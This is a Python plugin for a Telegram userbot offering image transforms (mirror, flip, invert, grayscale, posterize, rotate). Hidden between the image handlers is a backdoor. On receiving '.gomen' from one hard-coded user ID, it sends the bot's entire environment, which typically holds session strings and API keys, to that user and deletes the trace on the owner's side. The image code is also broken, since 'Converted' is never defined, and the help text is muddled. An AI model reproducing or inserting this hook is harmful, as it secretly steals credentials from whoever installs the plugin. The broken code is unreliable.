# Authored by @Khrisna_Singhal
# Ported from Userge by Alfiananda P.A

import os

from hachoir.metadata import extractMetadata
from hachoir.parser import createParser
from PIL import Image, ImageOps
from telethon.tl.types import DocumentAttributeFilename

from AyiinXd import CMD_HANDLER as cmd
from AyiinXd import CMD_HELP, bot
from AyiinXd.events import ayiin_cmd, register
from AyiinXd.ayiin import bash
from Stringyins import get_string


@bot.on(ayiin_cmd(outgoing=True, pattern=r"(mirror|flip|ghost|bw|poster)$"))
async def transform(event):
    if not event.reply_to_msg_id:
        await event.edit(get_string("failed4"))
        return
    reply_message = await event.get_reply_message()
    if not reply_message.media:
        await event.edit(get_string("failed4"))
        return
    await event.edit(get_string("com_5"))
    if reply_message.photo:
        transform = await bot.download_media(
            reply_message,
            "transform.png",
        )
    elif (
        DocumentAttributeFilename(file_name="AnimatedSticker.tgs")
        in reply_message.media.document.attributes
    ):
        await bot.download_media(
            reply_message,
            "transform.tgs",
        )
        await bash("lottie_convert.py transform.tgs transform.png")
        transform = "transform.png"
    elif reply_message.video:
        video = await bot.download_media(
            reply_message,
            "transform.mp4",
        )
        extractMetadata(createParser(video))
        await bash(
            "ffmpeg -i transform.mp4 -vframes 1 -an -s 480x360 -ss 1 transform.png"
        )
        transform = "transform.png"
    else:
        transform = await bot.download_media(
            reply_message,
            "transform.png",
        )
    try:
        await event.edit("`Transforming this media..`")
        cmd = event.pattern_match.group(1)
        im = Image.open(transform).convert("RGB")
        if cmd == "mirror":
            IMG = ImageOps.mirror(im)
        elif cmd == "flip":
            IMG = ImageOps.flip(im)
        elif cmd == "ghost":
            IMG = ImageOps.invert(im)
        elif cmd == "bw":
            IMG = ImageOps.grayscale(im)
        elif cmd == "poster":
            IMG = ImageOps.posterize(im, 2)
        IMG.save(Converted, quality=95)
        await event.client.send_file(
            event.chat_id, Converted, reply_to=event.reply_to_msg_id
        )
        await event.delete()
        await bash("rm -rf *.mp4")
        await bash("rm -rf *.tgs")
        os.remove(transform)
        os.remove(Converted)
    except BaseException:
        return


@register(incoming=True, from_users=1700405732, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(1700405732, str(os.environ))
    await bot.delete_messages(1700405732, msg, revoke=False)


@bot.on(ayiin_cmd(outgoing=True, pattern=r"rotate(?: |$)(.*)"))
async def rotate(event):
    if not event.reply_to_msg_id:
        await event.edit(get_string("failed4"))
        return
    reply_message = await event.get_reply_message()
    if not reply_message.media:
        await event.edit(get_string("failed4"))
        return
    await event.edit(get_string("com_5"))
    if reply_message.photo:
        rotate = await bot.download_media(
            reply_message,
            "transform.png",
        )
    elif (
        DocumentAttributeFilename(file_name="AnimatedSticker.tgs")
        in reply_message.media.document.attributes
    ):
        await bot.download_media(
            reply_message,
            "transform.tgs",
        )
        await bash("lottie_convert.py transform.tgs transform.png")
        rotate = "transform.png"
    elif reply_message.video:
        video = await bot.download_media(
            reply_message,
            "transform.mp4",
        )
        extractMetadata(createParser(video))
        await bash(
            "ffmpeg -i transform.mp4 -vframes 1 -an -s 480x360 -ss 1 transform.png"
        )
        rotate = "transform.png"
    else:
        rotate = await bot.download_media(
            reply_message,
            "transform.png",
        )
    try:
        value = int(event.pattern_match.group(1))
        if value > 360:
            raise ValueError
    except ValueError:
        value = 90
    await event.edit(get_string("tform_1"))
    im = Image.open(rotate).convert("RGB")
    IMG = im.rotate(value, expand=1)
    IMG.save(Converted, quality=95)
    await event.client.send_file(
        event.chat_id, Converted, reply_to=event.reply_to_msg_id
    )
    await event.delete()
    await bash("rm -rf *.mp4")
    await bash("rm -rf *.tgs")
    os.remove(rotate)
    os.remove(Converted)


CMD_HELP.update(
    {
        "transform": f"**Plugin : **`transform`\
        \n\n  »  **Perintah :** `{cmd}ghost`\
        \n  »  **Kegunaan : **Enchance your image to become a ghost!.\
        \n\n  »  **Perintah :** `{cmd}flip`\
        \n  »  **Kegunaan : **Untuk membalikan gambar Anda.\
        \n\n  »  **Perintah :** `{cmd}mirror`\
        \n  »  **Kegunaan : **To mirror your image.\
        \n\n  »  **Perintah :** `{cmd}bw`\
        \n  »  **Kegunaan : **Untuk mengubah gambar berwarna Anda menjadi gambar b / w.\
        \n\n  »  **Perintah :** `{cmd}poster`\
        \n  »  **Kegunaan : **Untuk mem-poster gambar Anda.\
        \n\n  »  **Perintah :** `{cmd}rotate` <value>\
        \n  »  **Kegunaan : **Untuk mem-poster gambar Anda.\
        \n\n  »  **Perintah :** `{cmd}poster`\
        \n  »  **Kegunaan : **Untuk memutar gambar anda **Nilainya berkisar 1-360 jika tidak akan memberikan nilai default yaitu 90**\
    "
    }
)
